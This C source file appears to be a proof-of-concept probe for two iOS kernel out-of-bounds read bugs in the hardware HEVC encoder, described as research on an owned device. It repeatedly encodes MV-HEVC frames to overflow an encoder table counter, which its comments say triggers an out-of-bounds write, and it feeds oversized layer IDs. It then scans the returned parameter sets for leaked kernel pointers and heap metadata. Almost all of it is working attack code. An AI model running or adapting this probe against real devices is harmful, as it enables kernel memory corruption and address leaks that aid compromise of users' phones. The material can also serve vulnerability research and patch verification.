/*
 * ave_oob_read_probe.c — CVE-2026-112465 OOB Read Probe
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * Hypothesis: After counter overflow via repeated MV-HEVC encodes, the
 * VPS/SPS/PPS readback path reads past the table boundary because it uses
 * the same unbounded counter. This leaks adjacent kernel heap data into
 * the parameter set output returned to userspace.
 *
 * The two CVEs:
 *   CVE-2026-112465: "OOB read addressed with improved bounds checking"
 *     => Counter/index not bounds-checked before reading
 *   CVE-2026-112466: "OOB read addressed with improved input validation"
 *     => User input (layer_id?) directly controls read offset
 *
 * Test modes:
 *   safe      -- Single encode, dump returned parameter sets (baseline)
 *   multi     -- Multiple encodes (10, 50, 100), dump parameter sets each time
 *                to see if returned data grows or changes (counter-based read)
 *   overflow  -- 300+ encodes to push counter past table boundary, then read
 *                parameter sets — if OOB read exists, leaked data appears here
 *   readback  -- Encode with various layer_ids, compare returned VPS data size
 *                to detect layer_id-based OOB read (CVE-2026-112466)
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -framework IOKit -framework IOSurface
 *        -o AVEOOBReadProbe ave_oob_read_probe.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.aveoobread
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>

static FILE *g_log = NULL;
static int g_encode_count = 0;
static int g_last_paramset_total_bytes = 0;

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    fflush(stdout);
    va_end(ap);
}

static void dump_hex(const uint8_t *data, size_t len, const char *label) {
    rlog("  [%s] %zu bytes: ", label, len);
    for (size_t i = 0; i < len && i < 64; i++) {
        rlog("%02x", data[i]);
        if ((i + 1) % 16 == 0 && i + 1 < len) rlog("\n                     ");
    }
    if (len > 64) rlog("... (%zu more)", len - 64);
    rlog("\n");

    /* Check for potential kernel pointer patterns (0xFFFFFE00xxxxxxxx) */
    if (len >= 8) {
        for (size_t i = 0; i <= len - 8; i += 4) {
            uint64_t val = 0;
            memcpy(&val, data + i, 8);
            if ((val >> 40) == 0xFFFFFE) {
                rlog("  *** POTENTIAL KERNEL POINTER at offset %zu: 0x%016llx ***\n",
                     i, (unsigned long long)val);
            }
            /* Also check for heap metadata patterns */
            if ((val >> 48) == 0xFFFF && (val & 0xFFFF) != 0) {
                rlog("  *** POTENTIAL HEAP METADATA at offset %zu: 0x%016llx ***\n",
                     i, (unsigned long long)val);
            }
        }
    }
}

static void analyze_paramsets(CMFormatDescriptionRef fmt, int encode_num) {
    if (!fmt) return;

    size_t pset_count = 0;
    OSStatus ps = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
        fmt, 0, NULL, NULL, &pset_count, NULL);

    rlog("\n  [Encode #%d] paramSetCount=%zu (status=%d)\n", encode_num, pset_count, (int)ps);

    int total_bytes = 0;
    for (size_t i = 0; i < pset_count && i < 20; i++) {
        const uint8_t *pset = NULL;
        size_t pset_size = 0;
        int nal_type = -1;
        CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
            fmt, i, &pset, &pset_size, NULL, &nal_type);

        char label[64];
        const char *type_name = "UNK";
        switch (nal_type) {
            case 32: type_name = "VPS"; break;
            case 33: type_name = "SPS"; break;
            case 34: type_name = "PPS"; break;
            default: break;
        }
        snprintf(label, sizeof(label), "PS[%zu] %s(nal=%d)", i, type_name, nal_type);

        total_bytes += (int)pset_size;

        if (pset && pset_size > 0) {
            dump_hex(pset, pset_size, label);
        } else {
            rlog("  [%s] NULL or empty\n", label);
        }
    }

    /* Detect growth in parameter set size (key OOB read indicator) */
    if (g_last_paramset_total_bytes > 0 && total_bytes != g_last_paramset_total_bytes) {
        rlog("  *** PARAMETER SET SIZE CHANGED: %d -> %d bytes (delta=%+d) ***\n",
             g_last_paramset_total_bytes, total_bytes, total_bytes - g_last_paramset_total_bytes);
        if (total_bytes > g_last_paramset_total_bytes + 100) {
            rlog("  *** SIGNIFICANT GROWTH — POSSIBLE OOB READ LEAK ***\n");
        }
    }
    g_last_paramset_total_bytes = total_bytes;
}

typedef struct {
    int encode_num;
} EncodeCtx;

static void encode_cb(void *outputCallbackRefCon, void *sourceFrameRefCon,
                      OSStatus status, VTEncodeInfoFlags infoFlags,
                      CMSampleBufferRef sampleBuffer) {
    EncodeCtx *ctx = (EncodeCtx *)outputCallbackRefCon;
    if (status != noErr) {
        rlog("  [CB] Encode #%d FAILED: %d\n", ctx ? ctx->encode_num : -1, (int)status);
        return;
    }
    if (sampleBuffer) {
        CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(sampleBuffer);
        if (fmt) {
            analyze_paramsets(fmt, ctx ? ctx->encode_num : -1);
        }
    }
}

static CVPixelBufferRef create_pixel_buffer(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x42, w * h * 4);
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static VTCompressionSessionRef create_mvhevc_session(int width, int height,
                                                      int layer_id,
                                                      EncodeCtx *ctx) {
    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    OSStatus st = VTCompressionSessionCreate(NULL, width, height,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        encode_cb, ctx, &session);
    CFRelease(enc_spec);

    if (st != noErr || !session) {
        rlog("  CREATE FAILED: %d\n", (int)st);
        return NULL;
    }

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);

    /* Set MV-HEVC layer IDs */
    int base_layer = 0;
    CFNumberRef ids[2];
    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base_layer);
    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
    VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);

    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base_layer);
    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
    VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
    CFRelease(left); CFRelease(right);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        rlog("  PREPARE FAILED: %d\n", (int)st);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NULL;
    }

    return session;
}

static int do_encode(VTCompressionSessionRef session, int width, int height,
                     int encode_num, EncodeCtx *ctx) {
    ctx->encode_num = encode_num;

    CVPixelBufferRef pb = create_pixel_buffer(width, height);
    if (!pb) {
        rlog("  PIXELBUF FAILED for encode #%d\n", encode_num);
        return -1;
    }

    CMTime pts = CMTimeMake(encode_num, 30);
    CMTime dur = CMTimeMake(1, 30);
    OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
    CVPixelBufferRelease(pb);

    if (st != noErr) {
        rlog("  ENCODE #%d FAILED: %d\n", encode_num, (int)st);
        return (int)st;
    }

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    usleep(100000);  /* 100ms for callback */

    return 0;
}

/* =========================================================================
 * TEST MODES
 * ========================================================================= */

static void test_safe(void) {
    rlog("\n== SAFE MODE: Single encode, dump parameter sets ==\n");

    EncodeCtx ctx = {0};
    VTCompressionSessionRef session = create_mvhevc_session(128, 128, 1, &ctx);
    if (!session) return;

    rlog("Session created. Encoding single frame...\n");
    do_encode(session, 128, 128, 1, &ctx);

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

static void test_multi(void) {
    rlog("\n== MULTI MODE: Encode 100 frames, check parameter set size growth ==\n");
    rlog("If OOB read exists via counter, parameter set data should grow\n");
    rlog("as the counter exceeds the table boundary.\n\n");

    EncodeCtx ctx = {0};
    VTCompressionSessionRef session = create_mvhevc_session(128, 128, 1, &ctx);
    if (!session) return;

    int checkpoints[] = {1, 5, 10, 20, 50, 80, 85, 86, 87, 88, 89, 90, 95, 100, -1};

    for (int i = 1; i <= 100; i++) {
        int is_checkpoint = 0;
        for (int j = 0; checkpoints[j] >= 0; j++) {
            if (i == checkpoints[j]) { is_checkpoint = 1; break; }
        }

        int ret = do_encode(session, 128, 128, i, &ctx);
        if (ret != 0) {
            rlog("\n*** Encode failed at #%d (status=%d) ***\n", i, ret);
            rlog("*** Counter overflow may have been detected ***\n");
            break;
        }

        if (!is_checkpoint) {
            /* Skip detailed output for non-checkpoint encodes */
            ctx.encode_num = -1;  /* suppress callback output */
        }
    }

    rlog("\n--- Final summary ---\n");
    rlog("Total encodes: %d\n", g_encode_count);
    rlog("Final parameter set total bytes: %d\n", g_last_paramset_total_bytes);

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

static void test_overflow(void) {
    rlog("\n== OVERFLOW MODE: 350+ encodes to push counter past table ==\n");
    rlog("VPS table has 256 entries. Each encode generates ~3 entries.\n");
    rlog("Entry 258+ = OOB write into inter-table gap.\n");
    rlog("If readback uses same counter, OOB read leaks gap data.\n\n");

    EncodeCtx ctx = {0};
    VTCompressionSessionRef session = create_mvhevc_session(128, 128, 1, &ctx);
    if (!session) return;

    /* Critical encode thresholds:
     * ~86 encodes = 258 entries = first OOB entry
     * ~200 encodes = 600 entries = deep into inter-table gap
     * ~230 encodes = 683 entries = cumsum limit hit
     */
    int critical_points[] = {1, 50, 80, 85, 86, 87, 88, 89, 90, 100, 150,
                             200, 220, 225, 228, 230, 232, 235, 240, 250,
                             260, 270, 280, 290, 300, 320, 340, 350, -1};

    for (int i = 1; i <= 350; i++) {
        int is_critical = 0;
        for (int j = 0; critical_points[j] >= 0; j++) {
            if (i == critical_points[j]) { is_critical = 1; break; }
        }

        ctx.encode_num = is_critical ? i : -1;

        int ret = do_encode(session, 128, 128, i, &ctx);
        if (ret != 0) {
            rlog("\n*** ENCODE FAILED AT #%d (status=%d) ***\n", i, ret);
            rlog("*** This tells us the counter overflow behavior ***\n");

            /* Try one more encode to see if session is dead */
            ctx.encode_num = i + 1;
            ret = do_encode(session, 128, 128, i + 1, &ctx);
            rlog("*** Recovery encode: %s (status=%d) ***\n",
                 ret == 0 ? "SUCCESS" : "FAILED", ret);
            break;
        }

        if (i % 50 == 0 && !is_critical) {
            rlog("  [Progress: %d/350 encodes completed]\n", i);
        }
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

static void test_readback(void) {
    rlog("\n== READBACK MODE: Test layer_id-based OOB read (CVE-2026-112466) ==\n");
    rlog("If readback uses layer_id as index without bounds check,\n");
    rlog("large layer_ids read past the parameter set buffer.\n\n");

    /* Test with various layer_ids and compare returned data */
    int layer_ids[] = {1, 2, 3, 10, 50, 100, 200, 255, 256, 500, 1000, 5000, -1};

    for (int j = 0; layer_ids[j] >= 0; j++) {
        int lid = layer_ids[j];
        rlog("\n--- layer_id=%d ---\n", lid);

        g_last_paramset_total_bytes = 0;
        EncodeCtx ctx = {0};
        VTCompressionSessionRef session = create_mvhevc_session(128, 128, lid, &ctx);
        if (!session) {
            rlog("  Session creation failed for layer_id=%d\n", lid);
            continue;
        }

        int ret = do_encode(session, 128, 128, 1, &ctx);
        if (ret != 0) {
            rlog("  Encode failed for layer_id=%d: %d\n", lid, ret);
        }

        VTCompressionSessionInvalidate(session);
        CFRelease(session);

        usleep(200000);  /* 200ms between sessions */
    }
}

int main(int argc, char *argv[]) {
    char logpath[512];
    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_oob_read.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    g_log = fopen(logpath, "w");

    rlog("=== CVE-2026-112465/112466 OOB Read Probe ===\n");
    rlog("Target: detect kernel memory leak via VPS table readback\n");
    rlog("Time: %s\n", __TIMESTAMP__);
    rlog("PID: %d\n", getpid());

    const char *mode = (argc > 1) ? argv[1] : "safe";

    if (strcmp(mode, "safe") == 0) {
        test_safe();
    } else if (strcmp(mode, "multi") == 0) {
        test_multi();
    } else if (strcmp(mode, "overflow") == 0) {
        test_overflow();
    } else if (strcmp(mode, "readback") == 0) {
        test_readback();
    } else {
        rlog("Usage: AVEOOBReadProbe <mode>\n");
        rlog("  safe      -- single encode baseline\n");
        rlog("  multi     -- 100 encodes, watch for parameter set growth\n");
        rlog("  overflow  -- 350 encodes, push past table boundary\n");
        rlog("  readback  -- various layer_ids, detect OOB read\n");
    }

    rlog("\n=== Probe complete ===\n");
    if (g_log) fclose(g_log);
    return 0;
}
